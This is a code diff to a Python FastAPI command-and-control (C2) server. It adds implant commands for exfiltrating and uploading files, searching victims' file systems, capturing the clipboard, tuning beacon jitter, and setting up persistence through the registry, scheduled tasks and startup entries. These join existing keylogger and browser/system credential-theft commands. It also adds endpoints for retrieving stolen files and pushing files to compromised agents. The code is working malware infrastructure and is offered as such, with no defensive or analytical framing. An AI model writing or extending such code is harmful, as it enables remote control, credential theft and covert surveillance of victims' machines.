@@ -1,8 +1,8 @@
 """C2 Server Main Application"""
 
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, status, Body
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, status, Body, UploadFile, File, Form
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse
+from fastapi.responses import JSONResponse, StreamingResponse
 from contextlib import asynccontextmanager
 import logging
 import json
@@ -141,9 +141,20 @@ def convert_to_rust_command(cmd: dict) -> dict:
         "keylogger_stop": lambda: "keylogger_stop",
         "keylogger_logs": lambda: "keylogger_logs",
         "keylogger_clear": lambda: "keylogger_clear",
+        "download_file": lambda: {"download": {"path": cmd.get("path", "")}},
+        "upload_file": lambda: {"upload": {"path": cmd.get("path", ""), "data": cmd.get("data", "")}},
+        "search_files": lambda: {"search_files": {"root": cmd.get("root", "."), "pattern": cmd.get("pattern", ""), "max_depth": cmd.get("max_depth", 5)}},
         "credentials_browser": lambda: "credentials_browser",
         "credentials_system": lambda: "credentials_system",
         "credentials_all": lambda: "credentials_all",
+        "config_beacon": lambda: {"config_beacon": {"sleep_ms": cmd.get("sleep_ms", 10000), "jitter_pct": cmd.get("jitter_pct", 0.33)}},
+        "clipboard_start": lambda: "clipboard_start",
+        "clipboard_stop": lambda: "clipboard_stop",
+        "clipboard_logs": lambda: "clipboard_logs",
+        "persist_registry": lambda: "persist_registry",
+        "persist_schtask": lambda: "persist_schtask",
+        "persist_startup": lambda: "persist_startup",
+        "persist_remove": lambda: "persist_remove",
     }
     if cmd_type in mapping:
         return mapping[cmd_type]()
@@ -381,6 +392,59 @@ async def get_agent_commands(agent_id: str):
     return {
         "agent_id": agent_id,
         "commands": agent_manager.get_command_history(agent_id),
+    }
+
+
+# ============ File Transfer Endpoints ============
+
+@app.get("/api/live/agents/{agent_id}/download/{cmd_id}")
+async def download_file_result(agent_id: str, cmd_id: int):
+    """Download a file from a completed download command result"""
+    import base64
+    import io
+
+    for entry in agent_manager.get_command_history(agent_id):
+        if entry.get("cmd_id") == cmd_id:
+            if entry.get("status") != "success":
+                return JSONResponse(status_code=400, content={"detail": "Command failed"})
+            try:
+                output = json.loads(entry.get("output", "{}"))
+                file_data = base64.b64decode(output.get("data", ""))
+                filename = output.get("filename", "download")
+                return StreamingResponse(
+                    io.BytesIO(file_data),
+                    media_type="application/octet-stream",
+                    headers={"Content-Disposition": f'attachment; filename="{filename}"'}
+                )
+            except Exception as e:
+                return JSONResponse(status_code=500, content={"detail": str(e)})
+    return JSONResponse(status_code=404, content={"detail": "Command not found"})
+
+
+@app.post("/api/live/agents/{agent_id}/upload")
+async def upload_file_to_agent(agent_id: str, file: UploadFile = File(...), dest_path: str = Form(...)):
+    """Upload a file to an agent by queuing an upload command"""
+    import base64
+
+    if not agent_manager.is_connected(agent_id):
+        return JSONResponse(status_code=404, content={"detail": f"Agent {agent_id} is not connected"})
+
+    file_data = await file.read()
+    max_size = 10 * 1024 * 1024  # 10MB
+    if len(file_data) > max_size:
+        return JSONResponse(status_code=413, content={"detail": f"File too large ({len(file_data)} bytes, max {max_size})"})
+
+    b64_data = base64.b64encode(file_data).decode("utf-8")
+
+    cmd = {"command_type": "upload_file", "path": dest_path, "data": b64_data}
+    cmd_id = agent_manager.queue_command(agent_id, cmd)
+
+    return {
+        "status": "queued",
+        "cmd_id": cmd_id,
+        "filename": file.filename,
+        "size": len(file_data),
+        "dest_path": dest_path,
     }
 
 
